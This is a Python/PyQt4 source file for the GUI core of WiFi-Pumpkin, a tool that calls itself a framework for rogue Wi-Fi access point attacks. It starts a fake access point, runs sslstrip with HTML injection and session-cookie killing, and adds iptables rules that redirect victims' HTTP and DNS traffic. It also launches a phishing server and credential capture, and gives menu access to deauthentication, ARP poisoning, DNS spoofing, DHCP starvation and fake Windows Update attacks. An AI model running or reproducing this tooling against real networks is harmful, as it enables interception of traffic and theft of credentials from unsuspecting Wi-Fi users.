import logging
from Proxy import *
from sys import argv
import Modules as pkg
from re import search
from shutil import move
from time import asctime
from PyQt4.QtGui import *
from PyQt4.QtCore import *
from ast import literal_eval
from os import system,path,getcwd,chdir,popen,listdir,mkdir
from subprocess import Popen,PIPE,STDOUT,call,check_output,CalledProcessError
from isc_dhcp_leases.iscdhcpleases import IscDhcpLeases
from Core.Utils import ProcessThread,Refactor,setup_logger,set_monitor_mode,ProcessHostapd,ThreadPopen
from Core.helpers.update import frm_githubUpdate
from Core.config.Settings import frm_Settings
from Core.helpers.about import frmAbout
from twisted.web import http
from twisted.internet import reactor
from Plugins.sslstrip.StrippingProxy import StrippingProxy
from Plugins.sslstrip.URLMonitor import URLMonitor
from Plugins.sslstrip.CookieCleaner import CookieCleaner
if search('/usr/share/',argv[0]):chdir('/usr/share/WiFi-Pumpkin/')

"""
Description:
    This program is a Core for wifi-pumpkin.py. file which includes functionality
    for mount Access point.

Copyright:
    Copyright (C) 2015 Marcos Nesster P0cl4bs Team
    This program is free software: you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program.  If not, see <http://www.gnu.org/licenses/>
"""


author      = 'Marcos Nesster (@mh4x0f)  P0cl4bs Team'
emails      = ['mh4root@gmail.com','p0cl4bs@gmail.com']
license     = ' GNU GPL 3'
version     = '0.7.3'
update      = '25/01/2016' # This is Brasil :D
desc        = ['Framework for Rogue Wi-Fi Access Point Attacks']

class Initialize(QMainWindow):
    ''' Main window settings multi-window opened'''
    def __init__(self, parent=None):
        super(Initialize, self).__init__(parent)
        self.form_widget    = SubMain(self)
        self.FSettings      = frm_Settings()
        self.setCentralWidget(self.form_widget)
        self.setWindowTitle('WiFi-Pumpkin v' + version)
        self.setGeometry(0, 0, 320, 400)
        self.loadtheme(self.FSettings.XmlThemeSelected())

    def loadtheme(self,theme):
        sshFile=("Core/%s.qss"%(theme))
        with open(sshFile,"r") as fh:
            self.setStyleSheet(fh.read())

    def center(self):
        frameGm = self.frameGeometry()
        centerPoint = QDesktopWidget().availableGeometry().center()
        frameGm.moveCenter(centerPoint)
        self.move(frameGm.topLeft())

    def closeEvent(self, event):
        outputiwconfig = popen('iwconfig').readlines()
        for i in outputiwconfig:
            if search('Mode:Monitor',i):
                reply = QMessageBox.question(self,
                'About Exit','Are you sure to quit?', QMessageBox.Yes |
                    QMessageBox.No, QMessageBox.No)
                if reply == QMessageBox.Yes:
                    event.accept()
                    set_monitor_mode(i.split()[0]).setDisable()
                    return
                event.ignore()

class ThRunDhcp(QThread):
    ''' thread: run DHCP on background fuctions'''
    sendRequest = pyqtSignal(object)
    def __init__(self,args):
        QThread.__init__(self)
        self.args    = args
        self.process = None

    def run(self):
        print 'Starting Thread:' + self.objectName()
        self.process = Popen(self.args,
        stdout=PIPE,stderr=STDOUT)
        setup_logger('dhcp', './Logs/AccessPoint/dhcp.log')
        loggerDhcp = logging.getLogger('dhcp')
        loggerDhcp.info('---[ Start DHCP '+asctime()+']---')
        for line,data in enumerate(iter(self.process.stdout.readline, b'')):
            if 'DHCPREQUEST for' in data.rstrip():
                self.sendRequest.emit(data.split())
            elif 'DHCPACK on' in data.rstrip():
                self.sendRequest.emit(data.split())
            loggerDhcp.info(data.rstrip())

    def stop(self):
        print 'Stop thread:' + self.objectName()
        if self.process is not None:
            self.process.terminate()
            self.process = None

class Threadsslstrip(QThread):
    '''Thread: run sslstrip on brackground'''
    def __init__(self,port,plugins={},data= {}):
        QThread.__init__(self)
        self.port     = port
        self.plugins  = plugins
        self.loaderPlugins = data
    def run(self):
        print 'Starting Thread:' + self.objectName()
        listenPort   = self.port
        spoofFavicon = False
        killSessions = True
        print 'SSLstrip v0.9 by Moxie Marlinspike (@xtr4nge v0.9.2)::Online'
        if self.loaderPlugins['Plugins'] != None:
            self.plugins[self.loaderPlugins['Plugins']].getInstance()._activated = True
            self.plugins[self.loaderPlugins['Plugins']].getInstance().setInjectionCode(
                self.loaderPlugins['Content'])
        URLMonitor.getInstance().setFaviconSpoofing(spoofFavicon)
        CookieCleaner.getInstance().setEnabled(killSessions)
        strippingFactory              = http.HTTPFactory(timeout=10)
        strippingFactory.protocol     = StrippingProxy
        reactor.listenTCP(int(listenPort), strippingFactory)
        reactor.run(installSignalHandlers=False)
    def stop(self):
        print 'Stop thread:' + self.objectName()
        try:
            reactor.stop()
        except Exception:
            pass

class PopUpPlugins(QWidget):
    ''' this module control all plugins to MITM attack'''
    def __init__(self,FSettings):
        QWidget.__init__(self)
        self.FSettings = FSettings
        self.layout = QVBoxLayout(self)
        self.title = QLabel('::Available Plugins::')
        self.check_sslstrip = QCheckBox('::ssLstrip')
        self.check_netcreds = QCheckBox('::net-creds')
        self.check_dns2proy = QCheckBox('::dns2proxy')
        self.check_dns2proy.clicked.connect(self.checkBoxDns2proxy)
        self.check_sslstrip.clicked.connect(self.checkBoxSslstrip)
        self.check_netcreds.clicked.connect(self.checkBoxNecreds)
        self.layout.addWidget(self.title)
        self.layout.addWidget(self.check_sslstrip)
        self.layout.addWidget(self.check_netcreds)
        self.layout.addWidget(self.check_dns2proy)
    # control checkbox plugins
    def checkBoxSslstrip(self):
        if not self.check_sslstrip.isChecked():
            self.unset_Rules('sslstrip')
            self.FSettings.xmlSettings('sslstrip_plugin','status','False',False)
        elif self.check_sslstrip.isChecked():
            self.set_sslStripRule()
            self.FSettings.xmlSettings('sslstrip_plugin','status','True',False)
    def checkBoxDns2proxy(self):
        if not self.check_dns2proy.isChecked():
            self.unset_Rules('dns2proxy')
            self.FSettings.xmlSettings('dns2proxy_plugin','status','False',False)
        elif self.check_dns2proy.isChecked():
            self.set_Dns2proxyRule()
            self.FSettings.xmlSettings('dns2proxy_plugin','status','True',False)
    def checkBoxNecreds(self):
        if self.check_netcreds.isChecked():
            self.FSettings.xmlSettings('netcreds_plugin','status','True',False)
        else:
            self.FSettings.xmlSettings('netcreds_plugin','status','False',False)

    # set rules to sslstrip
    def set_sslStripRule(self):
        item = QListWidgetItem()
        item.setText('iptables -t nat -A PREROUTING -p '+
        'tcp --destination-port 80 -j REDIRECT --to-port '+self.FSettings.redirectport.text())
        item.setSizeHint(QSize(30,30))
        self.FSettings.ListRules.addItem(item)
    # set redirect port rules dns2proy
    def set_Dns2proxyRule(self):
        item = QListWidgetItem()
        item.setText('iptables -t nat -A PREROUTING -p '+
        'udp --destination-port 53 -j REDIRECT --to-port 53')
        item.setSizeHint(QSize(30,30))
        self.FSettings.ListRules.addItem(item)

    def unset_Rules(self,type):
        items = []
        for index in xrange(self.FSettings.ListRules.count()):
            items.append(str(self.FSettings.ListRules.item(index).text()))
        for i,j in enumerate(items):
            if type == 'sslstrip':
                if search(str('tcp --destination-port 80 -j REDIRECT --to-port '+
                    self.FSettings.redirectport.text()),j):
                    self.FSettings.ListRules.takeItem(i)
            elif type =='dns2proxy':
                if search('udp --destination-port 53 -j REDIRECT --to-port 53',j):
                    self.FSettings.ListRules.takeItem(i)


class PopUpServer(QWidget):
    ''' this module fast access to phishing-manager'''
    def __init__(self,FSettings):
        QWidget.__init__(self)
        self.FSettings  = FSettings
        self.Ftemplates = pkg.frm_PhishingManager()
        self.layout     = QVBoxLayout(self)
        self.FormLayout = QFormLayout()
        self.GridForm   = QGridLayout()
        self.StatusLabel        = QLabel(self)
        self.title              = QLabel('::Server-HTTP::')
        self.btntemplates       = QPushButton('Phishing M.')
        self.btnStopServer      = QPushButton('Stop Server')
        self.btnRefresh         = QPushButton('ReFresh')
        self.txt_IP             = QLineEdit(self)
        self.txt_IP.setVisible(False)
        self.ComboIface         = QComboBox(self)
        self.StatusServer(False)
        #icons
        self.btntemplates.setIcon(QIcon('Icons/page.png'))
        self.btnStopServer.setIcon(QIcon('Icons/close.png'))
        self.btnRefresh.setIcon(QIcon('Icons/refresh.png'))

        #conects
        self.refrash_interface()
        self.btntemplates.clicked.connect(self.show_template_dialog)
        self.btnStopServer.clicked.connect(self.StopLocalServer)
        self.btnRefresh.clicked.connect(self.refrash_interface)
        self.connect(self.ComboIface, SIGNAL('currentIndexChanged(QString)'), self.discoveryIface)

        #layout
        self.GridForm.addWidget(self.ComboIface,0,1)
        self.GridForm.addWidget(self.btnRefresh,0,2)
        self.GridForm.addWidget(self.btntemplates,1,1)
        self.GridForm.addWidget(self.btnStopServer,1,2)
        self.FormLayout.addRow(self.title)
        self.FormLayout.addRow(self.GridForm)
        self.FormLayout.addRow('Status::',self.StatusLabel)
        self.layout.addLayout(self.FormLayout)


    def emit_template(self,log):
        if log == 'started':
            self.StatusServer(True)

    def StopLocalServer(self):
        self.StatusServer(False)
        self.Ftemplates.killThread()

    def StatusServer(self,server):
        if server:
            self.StatusLabel.setText('[ ON ]')
            self.StatusLabel.setStyleSheet('QLabel {  color : green; }')
        elif not server:
            self.StatusLabel.setText('[ OFF ]')
            self.StatusLabel.setStyleSheet('QLabel {  color : red; }')

    def refrash_interface(self):
        self.ComboIface.clear()
        n = Refactor.get_interfaces()['all']
        for i,j in enumerate(n):
            if search('at',j) or search('wlan',j):
                self.ComboIface.addItem(n[i])
                self.discoveryIface()

    def discoveryIface(self):
        iface = str(self.ComboIface.currentText())
        ip = Refactor.get_Ipaddr(iface)
        self.txt_IP.setText(ip)

    def show_template_dialog(self):
        self.connect(self.Ftemplates,SIGNAL('Activated ( QString ) '), self.emit_template)
        self.Ftemplates.txt_redirect.setText(self.txt_IP.text())
        self.Ftemplates.show()

class PumpkinProxy(QVBoxLayout):
    ''' settings  Transparent Proxy '''
    sendError = pyqtSignal(str)
    _PluginsToLoader = {'Plugins': None,'Content':''}
    def __init__(self,popup,parent = None):
        super(PumpkinProxy, self).__init__(parent)
        self.popup      = popup
        self.FSettings  = frm_Settings()
        self.Home       = QFormLayout()
        self.statusbar  = QStatusBar()
        self.lname      = QLabel('Proxy::scripts::')
        self.lstatus    = QLabel('')
        self.argsLabel  = QLabel('')
        self.hBox       = QHBoxLayout()
        self.hBoxargs   = QHBoxLayout()
        self.btnLoader  = QPushButton('Load Plugins')
        self.btnEnable  = QPushButton('Enable')
        self.btncancel  = QPushButton('Cancel')
        self.comboxBox  = QComboBox()
        self.log_inject = QListWidget()
        self.docScripts = QTextEdit()
        self.argsScripts= QLineEdit()
        self.btncancel.setIcon(QIcon('Icons/cancel.png'))
        self.btnLoader.setIcon(QIcon('Icons/search.png'))
        self.btnEnable.setIcon(QIcon('Icons/accept.png'))
        self.statusbar.addWidget(self.lname)
        self.statusbar.addWidget(self.lstatus)
        self.docScripts.setFixedHeight(50)
        self.statusInjection(False)
        self.argsScripts.setEnabled(False)

        # group settings
        self.GroupSettings  = QGroupBox()
        self.GroupSettings.setTitle('Settings:')
        self.SettingsLayout = QFormLayout()
        self.hBox.addWidget(self.comboxBox)
        self.hBox.addWidget(self.btnLoader)
        self.hBox.addWidget(self.btnEnable)
        self.hBoxargs.addWidget(self.argsLabel)
        self.hBoxargs.addWidget(self.argsScripts)
        self.hBoxargs.addWidget(self.btncancel)
        self.SettingsLayout.addRow(self.hBox)
        self.SettingsLayout.addRow(self.hBoxargs)
        self.GroupSettings.setLayout(self.SettingsLayout)
        #group logger
        self.GroupLogger  = QGroupBox()
        self.GroupLogger.setTitle('Logger Injection:')
        self.LoggerLayout = QFormLayout()
        self.LoggerLayout.addRow(self.log_inject)
        self.GroupLogger.setLayout(self.LoggerLayout)

        #group descriptions
        self.GroupDoc  = QGroupBox()
        self.GroupDoc.setTitle('Description:')
        self.DocLayout = QFormLayout()
        self.DocLayout.addRow(self.docScripts)
        self.GroupDoc.setLayout(self.DocLayout)

        #connections
        self.SearchProxyPlugins()
        self.readDocScripts('html_injector')
        self.btnLoader.clicked.connect(self.SearchProxyPlugins)
        self.connect(self.comboxBox,SIGNAL('currentIndexChanged(QString)'),self.readDocScripts)
        self.btnEnable.clicked.connect(self.setPluginsActivated)
        self.btncancel.clicked.connect(self.unsetPluginsConf)
        # add widgets
        self.Home.addRow(self.GroupSettings)
        self.Home.addRow(self.GroupDoc)
        self.Home.addRow(self.GroupLogger)
        self.Home.addRow(self.statusbar)
        self.addLayout(self.Home)

    def setPluginsActivated(self):
        if self.popup.check_sslstrip.isChecked():
            item = str(self.comboxBox.currentText())
            if self.plugins[str(item)]._requiresArgs:
                if len(self.argsScripts.text()) != 0:
                    self._PluginsToLoader['Plugins'] = item
                    self._PluginsToLoader['Content'] = str(self.argsScripts.text())
                else:
                    return self.sendError.emit('this module proxy requires {} args'.format(self.argsLabel.text()))
            else:
                self._PluginsToLoader['Plugins'] = item
            self.btnEnable.setEnabled(False)
            self.ProcessReadLogger()
            return self.statusInjection(True)
        self.sendError.emit('sslstrip is not enabled.'.format(self.argsLabel.text()))

    def ProcessReadLogger(self):
        if path.exists('Logs/AccessPoint/injectionPage.log'):
            self.injectionThread = ThreadPopen(['tail','-f','Logs/AccessPoint/injectionPage.log'])
            self.connect(self.injectionThread,SIGNAL('Activated ( QString ) '), self.GetloggerInjection)
            self.injectionThread.setObjectName('Pump-Proxy::Capture')
            return self.injectionThread.start()
        QMessageBox.warning(self,'error proxy logger','Pump-Proxy::capture is not found')

    def GetloggerInjection(self,data):
        self.log_inject.addItem(data)
        self.log_inject.scrollToBottom()

    def statusInjection(self,server):
        if server:
            self.lstatus.setText('[ ON ]')
            self.lstatus.setStyleSheet('QLabel {  color : green; }')
        else:
            self.lstatus.setText('[ OFF ]')
            self.lstatus.setStyleSheet('QLabel {  color : red; }')

    def readDocScripts(self,item):
        try:
            self.docScripts.setText(self.plugins[str(item)].__doc__)
            if self.plugins[str(item)]._requiresArgs:
                self.argsScripts.setEnabled(True)
                self.argsLabel.setText(self.plugins[str(item)]._argsname)
            else:
                self.argsScripts.setEnabled(False)
                self.argsLabel.setText('')
        except Exception:
            pass

    def unsetPluginsConf(self):
        if hasattr(self,'injectionThread'): self.injectionThread.stop()
        self._PluginsToLoader = {'Plugins': None,'args':''}
        self.btnEnable.setEnabled(True)
        self.statusInjection(False)
        self.argsScripts.clear()
        self.log_inject.clear()

    def SearchProxyPlugins(self):
        self.comboxBox.clear()
        self.plugin_classes = Plugin.PluginProxy.__subclasses__()
        self.plugins = {}
        for p in self.plugin_classes:
            self.plugins[p._name] = p()
        self.comboxBox.addItems(self.plugins.keys())

class PumpkinSettings(QVBoxLayout):
    ''' settings DHCP options'''
    sendMensage = pyqtSignal(str)
    def __init__(self, parent = None):
        super(PumpkinSettings, self).__init__(parent)
        self.SettingsDHCP  = {}
        self.FSettings     = frm_Settings()
        self.mainLayout    = QFormLayout()
        self.GroupDHCP     = QGroupBox()
        self.layoutDHCP    = QFormLayout()
        self.layoutbuttons = QHBoxLayout()
        self.btnDefault    = QPushButton('default')
        self.btnSave       = QPushButton('save settings')
        self.btnSave.setIcon(QIcon('Icons/export.png'))
        self.btnDefault.setIcon(QIcon('Icons/settings.png'))
        self.leaseTime_def = QLineEdit(self.FSettings.xmlSettings('leasetimeDef', 'value',None))
        self.leaseTime_Max = QLineEdit(self.FSettings.xmlSettings('leasetimeMax', 'value',None))
        self.netmask       = QLineEdit(self.FSettings.xmlSettings('netmask', 'value',None))
        self.range_dhcp    = QLineEdit(self.FSettings.xmlSettings('range', 'value',None))
        self.route         = QLineEdit(self.FSettings.xmlSettings('router', 'value',None))
        self.subnet        = QLineEdit(self.FSettings.xmlSettings('subnet', 'value',None))
        self.broadcast     = QLineEdit(self.FSettings.xmlSettings('broadcast', 'value',None))
        self.GroupDHCP.setTitle('DHCP-Settings')
        self.GroupDHCP.setLayout(self.layoutDHCP)
        self.layoutDHCP.addRow('default-lease-time',self.leaseTime_def)
        self.layoutDHCP.addRow('max-lease-time',self.leaseTime_Max)
        self.layoutDHCP.addRow('subnet',self.subnet)
        self.layoutDHCP.addRow('router',self.route)
        self.layoutDHCP.addRow('netmask',self.netmask)
        self.layoutDHCP.addRow('broadcast-address',self.broadcast)
        self.layoutDHCP.addRow('range-dhcp',self.range_dhcp)
        # layout add
        self.layoutbuttons.addWidget(self.btnSave)
        self.layoutbuttons.addWidget(self.btnDefault)
        self.layoutDHCP.addRow(self.layoutbuttons)

        # connects
        self.btnDefault.clicked.connect(self.setdefaultSettings)
        self.btnSave.clicked.connect(self.savesettingsDHCP)
        self.mainLayout.addRow(self.GroupDHCP)
        self.addLayout(self.mainLayout)

    def setdefaultSettings(self):
        self.leaseTime_def.setText(self.FSettings.xmlSettings('D-leasetimeDef', 'value',None))
        self.leaseTime_Max.setText(self.FSettings.xmlSettings('D-leasetimeMax', 'value',None))
        self.netmask.setText(self.FSettings.xmlSettings('D-netmask', 'value',None))
        self.range_dhcp.setText(self.FSettings.xmlSettings('D-range', 'value',None))
        self.route.setText(self.FSettings.xmlSettings('D-router', 'value',None))
        self.subnet.setText(self.FSettings.xmlSettings('D-subnet', 'value',None))
        self.broadcast.setText(self.FSettings.xmlSettings('D-broadcast', 'value',None))

    def savesettingsDHCP(self):
        self.FSettings.xmlSettings('leasetimeDef', 'value',str(self.leaseTime_def.text()))
        self.FSettings.xmlSettings('leasetimeMax', 'value',str(self.leaseTime_Max.text()))
        self.FSettings.xmlSettings('netmask', 'value', str(self.netmask.text()))
        self.FSettings.xmlSettings('range', 'value',str(self.range_dhcp.text()))
        self.FSettings.xmlSettings('router', 'value',str(self.route.text()))
        self.FSettings.xmlSettings('subnet', 'value',str(self.subnet.text()))
        self.FSettings.xmlSettings('broadcast', 'value',str(self.broadcast.text()))
        self.btnSave.setEnabled(False)
        self.sendMensage.emit('settings DHCP saved with success...')
        self.btnSave.setEnabled(True)

    def getPumpkinSettings(self):
        self.SettingsDHCP['leasetimeDef'] = str(self.leaseTime_def.text())
        self.SettingsDHCP['leasetimeMax'] = str(self.leaseTime_Max.text())
        self.SettingsDHCP['subnet'] = str(self.subnet.text())
        self.SettingsDHCP['router'] = str(self.route.text())
        self.SettingsDHCP['netmask'] = str(self.netmask.text())
        self.SettingsDHCP['broadcast'] = str(self.broadcast.text())
        self.SettingsDHCP['range'] = str(self.range_dhcp.text())
        return self.SettingsDHCP


class SubMain(QWidget):
    ''' load main window class'''
    def __init__(self, parent = None):
        super(SubMain, self).__init__(parent)
        #self.create_sys_tray()
        self.MainControl    = QVBoxLayout(self)
        self.TabControl     = QTabWidget(self)
        self.Tab_Default    = QWidget(self)
        self.Tab_Injector   = QWidget(self)
        self.Tab_Settings   = QWidget(self)
        self.TabControl.addTab(self.Tab_Default,'Home')
        self.TabControl.addTab(self.Tab_Injector,'Pump-Proxy')
        self.TabControl.addTab(self.Tab_Settings,'Pump-Settings')
        self.ContentTabHome    = QVBoxLayout(self.Tab_Default)
        self.ContentTabInject  = QVBoxLayout(self.Tab_Injector)
        self.ContentTabsettings= QVBoxLayout(self.Tab_Settings)
        self.Apthreads      = {'RougeAP': []}
        self.APclients      = {}
        self.ConfigTwin     = {
        'ProgCheck':[],'AP_iface': None,
        'PortRedirect': None, 'interface':'None'}
        self.THeaders       = {'ip-address':[], 'device':[], 'mac-address':[]}
        self.FSettings      = frm_Settings()
        self.PopUpPlugins   = PopUpPlugins(self.FSettings)
        self.checkPlugins()
        self.intGUI()

    def loadBanner(self):
        vbox = QVBoxLayout()
        vbox.setMargin(4)
        vbox.addStretch(2)
        self.FormBanner = QFormLayout()
        self.FormBanner.addRow(vbox)
        self.logo = QPixmap(getcwd() + '/Icons/logo.png')
        self.imagem = QLabel(self)
        self.imagem.setPixmap(self.logo)
        self.FormBanner.addRow(self.imagem)

    def InjectorTABContent(self):
        self.ProxyPluginsTAB = PumpkinProxy(self.PopUpPlugins)
        self.ProxyPluginsTAB.sendError.connect(self.GetErrorInjector)
        self.ContentTabInject.addLayout(self.ProxyPluginsTAB)

    def GetErrorInjector(self,data):
        QMessageBox.warning(self,'Error Module::Proxy',data)
    def GetmessageSave(self,data):
        QMessageBox.information(self,'Settings DHCP',data)

    def SettingsTABContent(self):
        self.PumpSettingsTAB = PumpkinSettings()
        self.PumpSettingsTAB.sendMensage.connect(self.GetmessageSave)
        self.ContentTabsettings.addLayout(self.PumpSettingsTAB)

    def DefaultTABContent(self):
        self.StatusBar = QStatusBar()
        self.StatusBar.setFixedHeight(15)
        self.StatusBar.addWidget(QLabel("::Access|Point::"))
        self.StatusDhcp = QLabel("")
        self.connectedCount = QLabel('')
        self.StatusDhcp = QLabel('')
        self.StatusBar.addWidget(self.StatusDhcp)
        self.Started(False)
        self.StatusBar.addWidget(QLabel(" "*21))
        self.StatusBar.addWidget(QLabel("::Clients::"))
        self.connectedCount.setText("0")
        self.connectedCount.setStyleSheet("QLabel {  color : yellow; }")
        self.StatusBar.addWidget(self.connectedCount)
        self.EditGateway = QLineEdit(self)
        self.EditApName = QLineEdit(self)
        self.EditChannel = QLineEdit(self)
        self.selectCard = QComboBox(self)

        # table information AP connected
        self.TabInfoAP = QTableWidget(5,3)
        self.TabInfoAP.setRowCount(50)
        self.TabInfoAP.setFixedHeight(150)
        self.TabInfoAP.resizeRowsToContents()
        self.TabInfoAP.setSizePolicy(QSizePolicy.Expanding, QSizePolicy.Expanding)
        self.TabInfoAP.horizontalHeader().setStretchLastSection(True)
        self.TabInfoAP.setSelectionBehavior(QAbstractItemView.SelectRows)
        self.TabInfoAP.setEditTriggers(QAbstractItemView.NoEditTriggers)
        self.TabInfoAP.verticalHeader().setVisible(False)
        self.TabInfoAP.setHorizontalHeaderLabels(self.THeaders.keys())

        #edits
        self.mConfigure()
        self.FormGroup2 = QFormLayout()
        self.FormGroup3 = QFormLayout()

        #popup settings
        self.btnPlugins = QToolButton(self)
        self.btnPlugins.setFixedHeight(25)
        self.btnPlugins.setIcon(QIcon('Icons/plugins.png'))
        self.btnPlugins.setText('[::Plugins::]')
        self.btnPlugins.setPopupMode(QToolButton.MenuButtonPopup)
        self.btnPlugins.setMenu(QMenu(self.btnPlugins))
        action = QWidgetAction(self.btnPlugins)
        action.setDefaultWidget(self.PopUpPlugins)
        self.btnPlugins.menu().addAction(action)

        self.btnHttpServer = QToolButton(self)
        self.btnHttpServer.setFixedHeight(25)
        self.btnHttpServer.setIcon(QIcon('Icons/phishing.png'))
        self.FormPopup = PopUpServer(self.FSettings)
        self.btnHttpServer.setPopupMode(QToolButton.MenuButtonPopup)
        self.btnHttpServer.setMenu(QMenu(self.btnHttpServer))
        action = QWidgetAction(self.btnHttpServer)
        action.setDefaultWidget(self.FormPopup)
        self.btnHttpServer.menu().addAction(action)

        self.GroupAP = QGroupBox()
        self.GroupAP.setTitle('Access Point::')
        self.FormGroup3.addRow('Gateway:', self.EditGateway)
        self.FormGroup3.addRow('AP Name:', self.EditApName)
        self.FormGroup3.addRow('Channel:', self.EditChannel)
        self.GroupAP.setLayout(self.FormGroup3)

        # grid network adapter fix
        self.btrn_refresh = QPushButton('Refresh')
        self.btrn_refresh.setIcon(QIcon('Icons/refresh.png'))
        self.btrn_refresh.clicked.connect(self.refrash_interface)

        self.layout = QFormLayout()
        self.GroupAdapter = QGroupBox()
        self.GroupAdapter.setFixedWidth(120)
        self.GroupAdapter.setTitle('Network Adapter::')
        self.layout.addRow(self.selectCard)
        self.layout.addRow(self.btrn_refresh)
        self.layout.addRow(self.btnPlugins,self.btnHttpServer)
        self.GroupAdapter.setLayout(self.layout)

        self.btn_start_attack = QPushButton('Start Access Point', self)
        self.btn_start_attack.setIcon(QIcon('Icons/start.png'))
        self.btn_cancelar = QPushButton('Stop Access Point', self)
        self.btn_cancelar.setIcon(QIcon('Icons/Stop.png'))
        self.btn_cancelar.clicked.connect(self.kill)
        self.btn_start_attack.clicked.connect(self.StartApFake)

        hBox = QHBoxLayout()
        hBox.addWidget(self.btn_start_attack)
        hBox.addWidget(self.btn_cancelar)

        self.slipt = QHBoxLayout()
        self.slipt.addWidget(self.GroupAP)
        self.slipt.addWidget(self.GroupAdapter)

        self.FormGroup2.addRow(hBox)
        self.FormGroup2.addRow(self.TabInfoAP)
        self.FormGroup2.addRow(self.StatusBar)
        self.ContentTabHome.addLayout(self.slipt)
        self.ContentTabHome.addLayout(self.FormGroup2)

    def intGUI(self):
        self.loadBanner()
        self.DefaultTABContent()
        self.InjectorTABContent()
        self.SettingsTABContent()

        self.myQMenuBar = QMenuBar(self)
        self.myQMenuBar.setFixedWidth(400)
        Menu_file = self.myQMenuBar.addMenu('&File')
        exportAction = QAction('Export Html', self)
        deleteAction = QAction('Clear Logger', self)
        exitAction = QAction('Exit', self)
        exitAction.setIcon(QIcon('Icons/close-pressed.png'))
        deleteAction.setIcon(QIcon('Icons/delete.png'))
        exportAction.setIcon(QIcon('Icons/export.png'))
        Menu_file.addAction(exportAction)
        Menu_file.addAction(deleteAction)
        Menu_file.addAction(exitAction)
        exitAction.triggered.connect(exit)
        deleteAction.triggered.connect(self.delete_logger)
        exportAction.triggered.connect(self.exportHTML)

        Menu_View = self.myQMenuBar.addMenu('&View')
        phishinglog = QAction('Monitor Phishing', self)
        netcredslog = QAction('Monitor NetCreds', self)
        dns2proxylog = QAction('Monitor Dns2proxy', self)
        #connect
        phishinglog.triggered.connect(self.credentials)
        netcredslog.triggered.connect(self.logsnetcreds)
        dns2proxylog.triggered.connect(self.logdns2proxy)
        #icons
        phishinglog.setIcon(QIcon('Icons/password.png'))
        netcredslog.setIcon(QIcon('Icons/logger.png'))
        dns2proxylog.setIcon(QIcon('Icons/proxy.png'))
        Menu_View.addAction(phishinglog)
        Menu_View.addAction(netcredslog)
        Menu_View.addAction(dns2proxylog)

        #tools Menu
        Menu_tools = self.myQMenuBar.addMenu('&Tools')
        ettercap = QAction('Active Ettercap', self)
        btn_drift = QAction('Active DriftNet', self)
        btn_drift.setShortcut('Ctrl+Y')
        ettercap.setShortcut('Ctrl+E')
        ettercap.triggered.connect(self.start_etter)
        btn_drift.triggered.connect(self.start_dift)

        # icons tools
        ettercap.setIcon(QIcon('Icons/ettercap.png'))
        btn_drift.setIcon(QIcon('Icons/capture.png'))
        Menu_tools.addAction(ettercap)
        Menu_tools.addAction(btn_drift)

        #menu module
        Menu_module = self.myQMenuBar.addMenu('&Modules')
        btn_deauth = QAction('Deauth Attack', self)
        btn_probe = QAction('Probe Request',self)
        btn_mac = QAction('Mac Changer', self)
        btn_dhcpStar = QAction('DHCP S. Attack',self)
        btn_winup = QAction('Windows Update',self)
        btn_arp = QAction('Arp Posion Attack',self)
        btn_dns = QAction('Dns Spoof Attack',self)
        btn_phishing = QAction('Phishing Manager',self)
        action_settings = QAction('Settings',self)

        # Shortcut modules
        btn_deauth.setShortcut('Ctrl+W')
        btn_probe.setShortcut('Ctrl+K')
        btn_mac.setShortcut('Ctrl+M')
        btn_dhcpStar.setShortcut('Ctrl+H')
        btn_winup.setShortcut('Ctrl+N')
        btn_dns.setShortcut('ctrl+D')
        btn_arp.setShortcut('ctrl+Q')
        btn_phishing.setShortcut('ctrl+Z')
        action_settings.setShortcut('Ctrl+X')

        #connect buttons
        btn_probe.triggered.connect(self.showProbe)
        btn_deauth.triggered.connect(self.formDauth)
        btn_mac.triggered.connect(self.form_mac)
        btn_dhcpStar.triggered.connect(self.show_dhcpDOS)
        btn_winup.triggered.connect(self.show_windows_update)
        btn_arp.triggered.connect(self.show_arp_posion)
        btn_dns.triggered.connect(self.show_dns_spoof)
        btn_phishing.triggered.connect(self.show_PhishingManager)
        action_settings.triggered.connect(self.show_settings)

        #icons Modules
        btn_arp.setIcon(QIcon('Icons/arp_.png'))
        btn_winup.setIcon(QIcon('Icons/arp.png'))
        btn_dhcpStar.setIcon(QIcon('Icons/dhcp.png'))
        btn_mac.setIcon(QIcon('Icons/mac.png'))
        btn_probe.setIcon(QIcon('Icons/probe.png'))
        btn_deauth.setIcon(QIcon('Icons/deauth.png'))
        btn_dns.setIcon(QIcon('Icons/dns_spoof.png'))
        btn_phishing.setIcon(QIcon('Icons/page.png'))
        action_settings.setIcon(QIcon('Icons/setting.png'))

        # add modules menu
        Menu_module.addAction(btn_deauth)
        Menu_module.addAction(btn_probe)
        Menu_module.addAction(btn_mac)
        Menu_module.addAction(btn_dhcpStar)
        Menu_module.addAction(btn_winup)
        Menu_module.addAction(btn_arp)
        Menu_module.addAction(btn_dns)
        Menu_module.addAction(btn_phishing)
        Menu_module.addAction(action_settings)

        #menu extra
        Menu_extra= self.myQMenuBar.addMenu('&Help')
        Menu_update = QAction('Update',self)
        Menu_about = QAction('About',self)
        Menu_issue = QAction('Submit issue',self)
        Menu_about.setIcon(QIcon('Icons/about.png'))
        Menu_issue.setIcon(QIcon('Icons/report.png'))
        Menu_update.setIcon(QIcon('Icons/update.png'))
        Menu_about.triggered.connect(self.about)
        Menu_issue.triggered.connect(self.issue)
        Menu_update.triggered.connect(self.show_update)
        Menu_extra.addAction(Menu_issue)
        Menu_extra.addAction(Menu_update)
        Menu_extra.addAction(Menu_about)

        self.MainControl.addLayout(self.FormBanner)
        self.MainControl.addWidget(self.TabControl)
        self.setLayout(self.MainControl)

    def show_arp_posion(self):
        self.Farp_posion = pkg.frm_Arp_Poison()
        self.Farp_posion.setGeometry(0, 0, 450, 300)
        self.Farp_posion.show()

    def show_update(self):
        self.FUpdate = frm_githubUpdate(version)
        self.FUpdate.resize(480, 280)
        self.FUpdate.show()

    def show_settings(self):
        self.FSettings.show()

    def show_windows_update(self):
        self.FWinUpdate = pkg.frm_update_attack()
        self.FWinUpdate.setGeometry(QRect(100, 100, 450, 300))
        self.FWinUpdate.show()

    def show_dhcpDOS(self):
        self.Fstar = pkg.frm_dhcp_Attack()
